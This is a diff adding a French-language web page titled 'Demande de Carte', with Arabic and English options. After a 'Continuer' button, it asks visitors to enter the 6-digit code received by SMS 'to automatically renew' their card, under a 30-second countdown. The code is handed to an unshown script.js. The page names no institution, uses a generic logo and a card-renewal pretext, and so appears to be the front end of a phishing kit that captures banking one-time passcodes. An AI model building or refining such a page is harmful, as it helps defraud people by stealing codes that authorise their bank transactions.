@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="fr" dir="ltr">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <title>Demande de Carte</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link href="style.css?v=3" rel="stylesheet" type="text/css" />
+</head>
+
+<body>
+  <div class="language-switcher">
+    <button class="lang-btn" onclick="changeLanguage('ar')" data-lang="ar">العربية</button>
+    <button class="lang-btn" onclick="changeLanguage('en')" data-lang="en">English</button>
+    <button class="lang-btn active" onclick="changeLanguage('fr')" data-lang="fr">Français</button>
+  </div>
+
+  <!-- Hero Section -->
+  <div class="hero-section" id="heroSection">
+    <div class="hero-content">
+      <div class="hero-image-wrapper">
+        <img src="hero-image.jpg" alt="Carte Classique" class="hero-image">
+      </div>
+      <button class="continue-button" id="continueBtn" onclick="showVerificationPage()">
+        <span id="continueBtnText">Continuer</span>
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M5 12H19M19 12L12 5M19 12L12 19" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </button>
+    </div>
+  </div>
+
+  <!-- Verification Section (Hidden by default) -->
+  <div class="verification-section hidden" id="verificationSection">
+    <div class="container">
+      <div class="logo">
+        <img src="logo.png" alt="Logo" width="150">
+      </div>
+      
+      <h1 id="title">Demande de Carte Classique</h1>
+      
+      <p class="message" id="message">Veuillez saisir le code à 6 chiffres envoyé par SMS pour renouveler automatiquement votre carte</p>
+      
+      <div class="timer" id="timer">
+        <span id="timeLeft">30</span> <span id="secondsText">secondes</span>
+      </div>
+      
+      <div class="code-input-container">
+        <input type="text" 
+               id="codeInput" 
+               class="code-input" 
+               maxlength="6" 
+               placeholder="000000"
+               pattern="[0-9]{6}"
+               inputmode="numeric">
+      </div>
+      
+      <button class="verify-button" id="verifyBtn" onclick="verifyCode()">Vérifier</button>
+      
+      <div id="result" class="result"></div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+
+</html>
